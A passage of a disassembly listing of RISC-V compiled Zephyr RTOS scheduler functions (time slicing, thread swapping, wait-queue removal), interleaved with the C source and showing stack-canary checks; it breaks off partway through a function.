80004dfc <add_thread_timeout>:
		z_priq_wait_add(&wait_q->waitq, thread);
	}
}

static void add_thread_timeout(struct k_thread *thread, k_timeout_t timeout)
{
80004dfc:	1101                	addi	sp,sp,-32
80004dfe:	ce06                	sw	ra,28(sp)
80004e00:	86b2                	mv	a3,a2
80004e02:	8000c7b7          	lui	a5,0x8000c
80004e06:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004e0a:	c63a                	sw	a4,12(sp)
80004e0c:	4701                	li	a4,0
	if (!K_TIMEOUT_EQ(timeout, K_FOREVER)) {
80004e0e:	57fd                	li	a5,-1
80004e10:	00b79463          	bne	a5,a1,80004e18 <add_thread_timeout+0x1c>
80004e14:	00f60a63          	beq	a2,a5,80004e28 <add_thread_timeout+0x2c>
80004e18:	862e                	mv	a2,a1
80004e1a:	800055b7          	lui	a1,0x80005
80004e1e:	6c058593          	addi	a1,a1,1728 # 800056c0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800056c1>
80004e22:	0561                	addi	a0,a0,24
80004e24:	074010ef          	jal	ra,80005e98 <z_add_timeout>
		z_add_thread_timeout(thread, timeout);
	}
}
80004e28:	8000c7b7          	lui	a5,0x8000c
80004e2c:	4732                	lw	a4,12(sp)
80004e2e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004e32:	8fb9                	xor	a5,a5,a4
80004e34:	4701                	li	a4,0
80004e36:	e781                	bnez	a5,80004e3e <add_thread_timeout+0x42>
80004e38:	40f2                	lw	ra,28(sp)
80004e3a:	6105                	addi	sp,sp,32
80004e3c:	8082                	ret
80004e3e:	6b5000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004e42 <z_sched_prio_cmp>:
{
80004e42:	1101                	addi	sp,sp,-32
80004e44:	ce06                	sw	ra,28(sp)
80004e46:	8000c7b7          	lui	a5,0x8000c
80004e4a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004e4e:	c63a                	sw	a4,12(sp)
80004e50:	4701                	li	a4,0
	int32_t b1 = thread_1->base.prio;
80004e52:	00e50783          	lb	a5,14(a0)
	int32_t b2 = thread_2->base.prio;
80004e56:	00e58503          	lb	a0,14(a1)
	if (b1 != b2) {
80004e5a:	00a78e63          	beq	a5,a0,80004e76 <z_sched_prio_cmp+0x34>
		return b2 - b1;
80004e5e:	8d1d                	sub	a0,a0,a5
}
80004e60:	8000c7b7          	lui	a5,0x8000c
80004e64:	4732                	lw	a4,12(sp)
80004e66:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004e6a:	8fb9                	xor	a5,a5,a4
80004e6c:	4701                	li	a4,0
80004e6e:	e791                	bnez	a5,80004e7a <z_sched_prio_cmp+0x38>
80004e70:	40f2                	lw	ra,28(sp)
80004e72:	6105                	addi	sp,sp,32
80004e74:	8082                	ret
	return 0;
80004e76:	4501                	li	a0,0
80004e78:	b7e5                	j	80004e60 <z_sched_prio_cmp+0x1e>
}
80004e7a:	679000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004e7e <z_reset_time_slice>:
{
80004e7e:	1101                	addi	sp,sp,-32
80004e80:	ce06                	sw	ra,28(sp)
80004e82:	cc22                	sw	s0,24(sp)
80004e84:	8000c7b7          	lui	a5,0x8000c
80004e88:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004e8c:	c63a                	sw	a4,12(sp)
80004e8e:	4701                	li	a4,0
	int ret = slice_ticks;
80004e90:	800097b7          	lui	a5,0x80009
80004e94:	04c7a403          	lw	s0,76(a5) # 8000904c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000904d>
	if (slice_time(curr) != 0) {
80004e98:	ec09                	bnez	s0,80004eb2 <z_reset_time_slice+0x34>
}
80004e9a:	8000c7b7          	lui	a5,0x8000c
80004e9e:	4732                	lw	a4,12(sp)
80004ea0:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004ea4:	8fb9                	xor	a5,a5,a4
80004ea6:	4701                	li	a4,0
80004ea8:	e78d                	bnez	a5,80004ed2 <z_reset_time_slice+0x54>
80004eaa:	40f2                	lw	ra,28(sp)
80004eac:	4462                	lw	s0,24(sp)
80004eae:	6105                	addi	sp,sp,32
80004eb0:	8082                	ret
		_current_cpu->slice_ticks = slice_time(curr) + sys_clock_elapsed();
80004eb2:	b9eff0ef          	jal	ra,80004250 <sys_clock_elapsed>
80004eb6:	942a                	add	s0,s0,a0
80004eb8:	800097b7          	lui	a5,0x80009
80004ebc:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004ec0:	cb80                	sw	s0,16(a5)
		z_set_timeout_expiry(slice_time(curr), false);
80004ec2:	4581                	li	a1,0
80004ec4:	800097b7          	lui	a5,0x80009
80004ec8:	04c7a503          	lw	a0,76(a5) # 8000904c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000904d>
80004ecc:	182010ef          	jal	ra,8000604e <z_set_timeout_expiry>
}
80004ed0:	b7e9                	j	80004e9a <z_reset_time_slice+0x1c>
80004ed2:	621000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004ed6 <k_sched_time_slice_set>:
{
80004ed6:	1101                	addi	sp,sp,-32
80004ed8:	ce06                	sw	ra,28(sp)
80004eda:	cc22                	sw	s0,24(sp)
80004edc:	ca26                	sw	s1,20(sp)
80004ede:	c84a                	sw	s2,16(sp)
80004ee0:	842a                	mv	s0,a0
80004ee2:	84ae                	mv	s1,a1
80004ee4:	8000c7b7          	lui	a5,0x8000c
80004ee8:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004eec:	c63a                	sw	a4,12(sp)
80004eee:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
80004ef0:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004ef2:	30047973          	csrrci	s2,mstatus,8
#endif

#ifdef CONFIG_SPIN_VALIDATE
	z_spin_lock_set_owner(l);
#endif
	return k;
80004ef6:	a88d                	j	80004f68 <k_sched_time_slice_set+0x92>
80004ef8:	4581                	li	a1,0
80004efa:	00f68733          	add	a4,a3,a5
80004efe:	04d76063          	bltu	a4,a3,80004f3e <k_sched_time_slice_set+0x68>
80004f02:	972e                	add	a4,a4,a1
80004f04:	4615                	li	a2,5
80004f06:	02c77733          	remu	a4,a4,a2
80004f0a:	40e68733          	sub	a4,a3,a4
80004f0e:	00e6b6b3          	sltu	a3,a3,a4
80004f12:	8f95                	sub	a5,a5,a3
80004f14:	ccccd6b7          	lui	a3,0xccccd
80004f18:	ccd68613          	addi	a2,a3,-819 # cccccccd <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xccccccce>
80004f1c:	02c787b3          	mul	a5,a5,a2
80004f20:	ccc68693          	addi	a3,a3,-820
80004f24:	02d706b3          	mul	a3,a4,a3
80004f28:	97b6                	add	a5,a5,a3
80004f2a:	02c706b3          	mul	a3,a4,a2
80004f2e:	02c73733          	mulhu	a4,a4,a2
80004f32:	97ba                	add	a5,a5,a4
80004f34:	07fe                	slli	a5,a5,0x1f
80004f36:	0016d713          	srli	a4,a3,0x1
80004f3a:	8fd9                	or	a5,a5,a4
80004f3c:	a0b1                	j	80004f88 <k_sched_time_slice_set+0xb2>
80004f3e:	4585                	li	a1,1
80004f40:	b7c9                	j	80004f02 <k_sched_time_slice_set+0x2c>
			slice_ticks = MAX(2, slice_ticks);
80004f42:	80009737          	lui	a4,0x80009
80004f46:	04f72623          	sw	a5,76(a4) # 8000904c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000904d>
		slice_max_prio = prio;
80004f4a:	800097b7          	lui	a5,0x80009
80004f4e:	0497a423          	sw	s1,72(a5) # 80009048 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009049>
		z_reset_time_slice(_current);
80004f52:	800097b7          	lui	a5,0x80009
80004f56:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004f5a:	4788                	lw	a0,8(a5)
80004f5c:	370d                	jal	80004e7e <z_reset_time_slice>
			  : "r" (key & MSTATUS_IEN)
80004f5e:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrs mstatus, %0"
80004f62:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
80004f66:	4785                	li	a5,1
80004f68:	eb9d                	bnez	a5,80004f9e <k_sched_time_slice_set+0xc8>
		_current_cpu->slice_ticks = 0;
80004f6a:	800097b7          	lui	a5,0x80009
80004f6e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004f72:	0007a823          	sw	zero,16(a5)
		t += off;
80004f76:	00940693          	addi	a3,s0,9
80004f7a:	0086b7b3          	sltu	a5,a3,s0
		if (result32 && (t < BIT64(32))) {
80004f7e:	f686ede3          	bltu	a3,s0,80004ef8 <k_sched_time_slice_set+0x22>
			return ((uint32_t)t) / (from_hz / to_hz);
80004f82:	4729                	li	a4,10
80004f84:	02e6d7b3          	divu	a5,a3,a4
		slice_ticks = k_ms_to_ticks_ceil32(slice);
80004f88:	80009737          	lui	a4,0x80009
80004f8c:	04f72623          	sw	a5,76(a4) # 8000904c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000904d>
		if (IS_ENABLED(CONFIG_TICKLESS_KERNEL) && slice > 0) {
80004f90:	fa805de3          	blez	s0,80004f4a <k_sched_time_slice_set+0x74>
			slice_ticks = MAX(2, slice_ticks);
80004f94:	4709                	li	a4,2
80004f96:	fae7d6e3          	bge	a5,a4,80004f42 <k_sched_time_slice_set+0x6c>
80004f9a:	4789                	li	a5,2
80004f9c:	b75d                	j	80004f42 <k_sched_time_slice_set+0x6c>
}
80004f9e:	8000c7b7          	lui	a5,0x8000c
80004fa2:	4732                	lw	a4,12(sp)
80004fa4:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004fa8:	8fb9                	xor	a5,a5,a4
80004faa:	4701                	li	a4,0
80004fac:	e799                	bnez	a5,80004fba <k_sched_time_slice_set+0xe4>
80004fae:	40f2                	lw	ra,28(sp)
80004fb0:	4462                	lw	s0,24(sp)
80004fb2:	44d2                	lw	s1,20(sp)
80004fb4:	4942                	lw	s2,16(sp)
80004fb6:	6105                	addi	sp,sp,32
80004fb8:	8082                	ret
80004fba:	539000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004fbe <k_sched_lock>:
		signal_pending_ipi();
	}
}

void k_sched_lock(void)
{
80004fbe:	1101                	addi	sp,sp,-32
80004fc0:	ce06                	sw	ra,28(sp)
80004fc2:	8000c7b7          	lui	a5,0x8000c
80004fc6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004fca:	c63a                	sw	a4,12(sp)
80004fcc:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
80004fce:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004fd0:	300476f3          	csrrci	a3,mstatus,8
80004fd4:	a005                	j	80004ff4 <k_sched_lock+0x36>
static inline void z_sched_lock(void)
{
	__ASSERT(!arch_is_in_isr(), "");
	__ASSERT(_current->base.sched_locked != 1U, "");

	--_current->base.sched_locked;
80004fd6:	800097b7          	lui	a5,0x80009
80004fda:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004fde:	4798                	lw	a4,8(a5)
80004fe0:	00f74783          	lbu	a5,15(a4)
80004fe4:	17fd                	addi	a5,a5,-1
80004fe6:	00f707a3          	sb	a5,15(a4)
			  : "r" (key & MSTATUS_IEN)
80004fea:	0086f793          	andi	a5,a3,8
	__asm__ volatile ("csrs mstatus, %0"
80004fee:	3007a073          	csrs	mstatus,a5
80004ff2:	4785                	li	a5,1
80004ff4:	d3ed                	beqz	a5,80004fd6 <k_sched_lock+0x18>
		SYS_PORT_TRACING_FUNC(k_thread, sched_lock);

		z_sched_lock();
	}
}
80004ff6:	8000c7b7          	lui	a5,0x8000c
80004ffa:	4732                	lw	a4,12(sp)
80004ffc:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005000:	8fb9                	xor	a5,a5,a4
80005002:	4701                	li	a4,0
80005004:	e781                	bnez	a5,8000500c <k_sched_lock+0x4e>
80005006:	40f2                	lw	ra,28(sp)
80005008:	6105                	addi	sp,sp,32
8000500a:	8082                	ret
8000500c:	4e7000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005010 <z_swap_next_thread>:

	z_reschedule_unlocked();
}

struct k_thread *z_swap_next_thread(void)
{
80005010:	1101                	addi	sp,sp,-32
80005012:	ce06                	sw	ra,28(sp)
80005014:	8000c737          	lui	a4,0x8000c
80005018:	95072783          	lw	a5,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000501c:	c63e                	sw	a5,12(sp)
8000501e:	4781                	li	a5,0
		 */
		signal_pending_ipi();
	}
	return ret;
#else
	return _kernel.ready_q.cache;
80005020:	800097b7          	lui	a5,0x80009
80005024:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005028:	4f88                	lw	a0,24(a5)
#endif
}
8000502a:	46b2                	lw	a3,12(sp)
8000502c:	95072783          	lw	a5,-1712(a4)
80005030:	8fb5                	xor	a5,a5,a3
80005032:	4681                	li	a3,0
80005034:	e781                	bnez	a5,8000503c <z_swap_next_thread+0x2c>
80005036:	40f2                	lw	ra,28(sp)
80005038:	6105                	addi	sp,sp,32
8000503a:	8082                	ret
8000503c:	4b7000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005040 <z_swap_irqlock>:
{
80005040:	1101                	addi	sp,sp,-32
80005042:	ce06                	sw	ra,28(sp)
80005044:	cc22                	sw	s0,24(sp)
80005046:	ca26                	sw	s1,20(sp)
80005048:	c84a                	sw	s2,16(sp)
8000504a:	842a                	mv	s0,a0
8000504c:	8000c7b7          	lui	a5,0x8000c
80005050:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005054:	c63a                	sw	a4,12(sp)
80005056:	4701                	li	a4,0
	old_thread = _current;
80005058:	800097b7          	lui	a5,0x80009
8000505c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005060:	0087a903          	lw	s2,8(a5)
	z_check_stack_sentinel();
80005064:	ff0ff0ef          	jal	ra,80004854 <z_check_stack_sentinel>
	old_thread->swap_retval = -EAGAIN;
80005068:	57d5                	li	a5,-11
8000506a:	08f92023          	sw	a5,128(s2)
	__asm__ volatile ("csrrc %0, mstatus, %1"
8000506e:	300477f3          	csrrci	a5,mstatus,8
	new_thread = z_swap_next_thread();
80005072:	3f79                	jal	80005010 <z_swap_next_thread>
	if (new_thread != old_thread) {
80005074:	00a90f63          	beq	s2,a0,80005092 <z_swap_irqlock+0x52>
80005078:	84aa                	mv	s1,a0
		_current_cpu->current = new_thread;
8000507a:	800097b7          	lui	a5,0x80009
8000507e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005082:	c788                	sw	a0,8(a5)
		z_reset_time_slice(new_thread);
80005084:	dfbff0ef          	jal	ra,80004e7e <z_reset_time_slice>
	z_riscv_switch(new, old);
80005088:	85ca                	mv	a1,s2
8000508a:	0844a503          	lw	a0,132(s1)
8000508e:	893fb0ef          	jal	ra,80000920 <z_riscv_switch>
			  : "r" (key & MSTATUS_IEN)
80005092:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrs mstatus, %0"
80005094:	30042073          	csrs	mstatus,s0
	return _current->swap_retval;
80005098:	800097b7          	lui	a5,0x80009
8000509c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800050a0:	479c                	lw	a5,8(a5)
800050a2:	0807a503          	lw	a0,128(a5)
}
800050a6:	8000c7b7          	lui	a5,0x8000c
800050aa:	4732                	lw	a4,12(sp)
800050ac:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800050b0:	8fb9                	xor	a5,a5,a4
800050b2:	4701                	li	a4,0
800050b4:	e799                	bnez	a5,800050c2 <z_swap_irqlock+0x82>
800050b6:	40f2                	lw	ra,28(sp)
800050b8:	4462                	lw	s0,24(sp)
800050ba:	44d2                	lw	s1,20(sp)
800050bc:	4942                	lw	s2,16(sp)
800050be:	6105                	addi	sp,sp,32
800050c0:	8082                	ret
800050c2:	431000ef          	jal	ra,80005cf2 <_StackCheckHandler>

800050c6 <z_reschedule_irqlock>:
{
800050c6:	1101                	addi	sp,sp,-32
800050c8:	ce06                	sw	ra,28(sp)
800050ca:	8000c7b7          	lui	a5,0x8000c
800050ce:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800050d2:	c63a                	sw	a4,12(sp)
800050d4:	4701                	li	a4,0
	return (key & MSTATUS_IEN) != 0;
800050d6:	00857793          	andi	a5,a0,8
	return arch_irq_unlocked(key) && !arch_is_in_isr();
800050da:	cb81                	beqz	a5,800050ea <z_reschedule_irqlock+0x24>
	bool ret = arch_curr_cpu()->nested != 0U;

	arch_irq_unlock(key);
	return ret;
#else
	return _kernel.cpus[0].nested != 0U;
800050dc:	80009737          	lui	a4,0x80009
800050e0:	52072703          	lw	a4,1312(a4) # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800050e4:	e319                	bnez	a4,800050ea <z_reschedule_irqlock+0x24>
		z_swap_irqlock(key);
800050e6:	3fa9                	jal	80005040 <z_swap_irqlock>
800050e8:	a019                	j	800050ee <z_reschedule_irqlock+0x28>
	__asm__ volatile ("csrs mstatus, %0"
800050ea:	3007a073          	csrs	mstatus,a5
}
800050ee:	8000c7b7          	lui	a5,0x8000c
800050f2:	4732                	lw	a4,12(sp)
800050f4:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800050f8:	8fb9                	xor	a5,a5,a4
800050fa:	4701                	li	a4,0
800050fc:	e781                	bnez	a5,80005104 <z_reschedule_irqlock+0x3e>
800050fe:	40f2                	lw	ra,28(sp)
80005100:	6105                	addi	sp,sp,32
80005102:	8082                	ret
80005104:	3ef000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005108 <z_swap>:
{
80005108:	1101                	addi	sp,sp,-32
8000510a:	ce06                	sw	ra,28(sp)
8000510c:	cc22                	sw	s0,24(sp)
8000510e:	ca26                	sw	s1,20(sp)
80005110:	c84a                	sw	s2,16(sp)
80005112:	84aa                	mv	s1,a0
80005114:	842e                	mv	s0,a1
80005116:	8000c7b7          	lui	a5,0x8000c
8000511a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000511e:	c63a                	sw	a4,12(sp)
80005120:	4701                	li	a4,0
	old_thread = _current;
80005122:	800097b7          	lui	a5,0x80009
80005126:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000512a:	0087a903          	lw	s2,8(a5)
	z_check_stack_sentinel();
8000512e:	f26ff0ef          	jal	ra,80004854 <z_check_stack_sentinel>
	old_thread->swap_retval = -EAGAIN;
80005132:	57d5                	li	a5,-11
80005134:	08f92023          	sw	a5,128(s2)
	if (!is_spinlock || lock != &sched_spinlock) {
80005138:	800097b7          	lui	a5,0x80009
8000513c:	54478793          	addi	a5,a5,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
80005140:	00f48463          	beq	s1,a5,80005148 <z_swap+0x40>
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005144:	300477f3          	csrrci	a5,mstatus,8
	new_thread = z_swap_next_thread();
80005148:	ec9ff0ef          	jal	ra,80005010 <z_swap_next_thread>
8000514c:	84aa                	mv	s1,a0
	if (new_thread != old_thread) {
8000514e:	00a90e63          	beq	s2,a0,8000516a <z_swap+0x62>
		_current_cpu->current = new_thread;
80005152:	800097b7          	lui	a5,0x80009
80005156:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000515a:	c788                	sw	a0,8(a5)
		z_reset_time_slice(new_thread);
8000515c:	d23ff0ef          	jal	ra,80004e7e <z_reset_time_slice>
	z_riscv_switch(new, old);
80005160:	85ca                	mv	a1,s2
80005162:	0844a503          	lw	a0,132(s1)
80005166:	fbafb0ef          	jal	ra,80000920 <z_riscv_switch>
			  : "r" (key & MSTATUS_IEN)
8000516a:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrs mstatus, %0"
8000516c:	30042073          	csrs	mstatus,s0
	return _current->swap_retval;
80005170:	800097b7          	lui	a5,0x80009
80005174:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005178:	479c                	lw	a5,8(a5)
8000517a:	0807a503          	lw	a0,128(a5)
}
8000517e:	8000c7b7          	lui	a5,0x8000c
80005182:	4732                	lw	a4,12(sp)
80005184:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005188:	8fb9                	xor	a5,a5,a4
8000518a:	4701                	li	a4,0
8000518c:	e799                	bnez	a5,8000519a <z_swap+0x92>
8000518e:	40f2                	lw	ra,28(sp)
80005190:	4462                	lw	s0,24(sp)
80005192:	44d2                	lw	s1,20(sp)
80005194:	4942                	lw	s2,16(sp)
80005196:	6105                	addi	sp,sp,32
80005198:	8082                	ret
8000519a:	359000ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000519e <z_reschedule>:
{
8000519e:	1101                	addi	sp,sp,-32
800051a0:	ce06                	sw	ra,28(sp)
800051a2:	8000c7b7          	lui	a5,0x8000c
800051a6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800051aa:	c63a                	sw	a4,12(sp)
800051ac:	4701                	li	a4,0
	return (key & MSTATUS_IEN) != 0;
800051ae:	0085f793          	andi	a5,a1,8
	return arch_irq_unlocked(key) && !arch_is_in_isr();
800051b2:	c385                	beqz	a5,800051d2 <z_reschedule+0x34>
	return _kernel.cpus[0].nested != 0U;
800051b4:	80009737          	lui	a4,0x80009
800051b8:	52072703          	lw	a4,1312(a4) # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800051bc:	eb19                	bnez	a4,800051d2 <z_reschedule+0x34>
	new_thread = _kernel.ready_q.cache;
800051be:	80009737          	lui	a4,0x80009
800051c2:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800051c6:	4f14                	lw	a3,24(a4)
	return new_thread != _current;
800051c8:	4718                	lw	a4,8(a4)
	if (resched(key.key) && need_swap()) {
800051ca:	00e68463          	beq	a3,a4,800051d2 <z_reschedule+0x34>
		z_swap(lock, key);
800051ce:	3f2d                	jal	80005108 <z_swap>
800051d0:	a019                	j	800051d6 <z_reschedule+0x38>
	__asm__ volatile ("csrs mstatus, %0"
800051d2:	3007a073          	csrs	mstatus,a5
}
800051d6:	8000c7b7          	lui	a5,0x8000c
800051da:	4732                	lw	a4,12(sp)
800051dc:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800051e0:	8fb9                	xor	a5,a5,a4
800051e2:	4701                	li	a4,0
800051e4:	e781                	bnez	a5,800051ec <z_reschedule+0x4e>
800051e6:	40f2                	lw	ra,28(sp)
800051e8:	6105                	addi	sp,sp,32
800051ea:	8082                	ret
800051ec:	307000ef          	jal	ra,80005cf2 <_StackCheckHandler>

800051f0 <z_get_next_switch_handle>:
 * @param interrupted Handle for the thread that was interrupted or NULL.
 * @retval Handle for the next thread to execute, or @p interrupted when
 *         no new thread is to be scheduled.
 */
void *z_get_next_switch_handle(void *interrupted)
{
800051f0:	1101                	addi	sp,sp,-32
800051f2:	ce06                	sw	ra,28(sp)
800051f4:	cc22                	sw	s0,24(sp)
800051f6:	ca26                	sw	s1,20(sp)
800051f8:	842a                	mv	s0,a0
800051fa:	8000c4b7          	lui	s1,0x8000c
800051fe:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005202:	c63e                	sw	a5,12(sp)
80005204:	4781                	li	a5,0
	z_check_stack_sentinel();
80005206:	e4eff0ef          	jal	ra,80004854 <z_check_stack_sentinel>
		}
	}
	signal_pending_ipi();
	return ret;
#else
	z_sched_usage_switch(_kernel.ready_q.cache);
8000520a:	800097b7          	lui	a5,0x80009
8000520e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005212:	4f98                	lw	a4,24(a5)
	_current->switch_handle = interrupted;
80005214:	4794                	lw	a3,8(a5)
80005216:	0886a223          	sw	s0,132(a3)
	_current_cpu->current = new_thread;
8000521a:	c798                	sw	a4,8(a5)
	set_current(_kernel.ready_q.cache);
	return _current->switch_handle;
8000521c:	08472503          	lw	a0,132(a4)
#endif
}
80005220:	4732                	lw	a4,12(sp)
80005222:	9504a783          	lw	a5,-1712(s1)
80005226:	8fb9                	xor	a5,a5,a4
80005228:	4701                	li	a4,0
8000522a:	e791                	bnez	a5,80005236 <z_get_next_switch_handle+0x46>
8000522c:	40f2                	lw	ra,28(sp)
8000522e:	4462                	lw	s0,24(sp)
80005230:	44d2                	lw	s1,20(sp)
80005232:	6105                	addi	sp,sp,32
80005234:	8082                	ret
80005236:	2bd000ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000523a <z_priq_dumb_remove>:
#endif

void z_priq_dumb_remove(sys_dlist_t *pq, struct k_thread *thread)
{
8000523a:	1101                	addi	sp,sp,-32
8000523c:	ce06                	sw	ra,28(sp)
8000523e:	8000c7b7          	lui	a5,0x8000c
80005242:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005246:	c63a                	sw	a4,12(sp)
80005248:	4701                	li	a4,0
 * @param node the node to remove
 */

static inline void sys_dlist_remove(sys_dnode_t *node)
{
	sys_dnode_t *const prev = node->prev;
8000524a:	41d4                	lw	a3,4(a1)
	sys_dnode_t *const next = node->next;
8000524c:	4198                	lw	a4,0(a1)

	prev->next = next;
8000524e:	c298                	sw	a4,0(a3)
	next->prev = prev;
80005250:	c354                	sw	a3,4(a4)
	node->next = NULL;
80005252:	0005a023          	sw	zero,0(a1)
	node->prev = NULL;
80005256:	0005a223          	sw	zero,4(a1)
	__ASSERT_NO_MSG(!z_is_idle_thread_object(thread));

	sys_dlist_remove(&thread->base.qnode_dlist);
}
8000525a:	4732                	lw	a4,12(sp)
8000525c:	9507a783          	lw	a5,-1712(a5)
80005260:	8fb9                	xor	a5,a5,a4
80005262:	4701                	li	a4,0
80005264:	e781                	bnez	a5,8000526c <z_priq_dumb_remove+0x32>
80005266:	40f2                	lw	ra,28(sp)
80005268:	6105                	addi	sp,sp,32
8000526a:	8082                	ret
8000526c:	287000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005270 <unpend_thread_no_timeout>:
{
80005270:	1101                	addi	sp,sp,-32
80005272:	ce06                	sw	ra,28(sp)
80005274:	cc22                	sw	s0,24(sp)
80005276:	ca26                	sw	s1,20(sp)
80005278:	842a                	mv	s0,a0
8000527a:	8000c4b7          	lui	s1,0x8000c
8000527e:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005282:	c63e                	sw	a5,12(sp)
80005284:	4781                	li	a5,0
	_priq_wait_remove(&pended_on_thread(thread)->waitq, thread);
80005286:	b4fff0ef          	jal	ra,80004dd4 <pended_on_thread>
8000528a:	85a2                	mv	a1,s0
8000528c:	377d                	jal	8000523a <z_priq_dumb_remove>
	thread->base.thread_state &= ~_THREAD_PENDING;
8000528e:	00d44783          	lbu	a5,13(s0)
80005292:	9bf5                	andi	a5,a5,-3
80005294:	00f406a3          	sb	a5,13(s0)
	thread->base.pended_on = NULL;
80005298:	00042423          	sw	zero,8(s0)
}
8000529c:	4732                	lw	a4,12(sp)
8000529e:	9504a783          	lw	a5,-1712(s1)
800052a2:	8fb9                	xor	a5,a5,a4
800052a4:	4701                	li	a4,0
800052a6:	e791                	bnez	a5,800052b2 <unpend_thread_no_timeout+0x42>
800052a8:	40f2                	lw	ra,28(sp)
800052aa:	4462                	lw	s0,24(sp)
800052ac:	44d2                	lw	s1,20(sp)
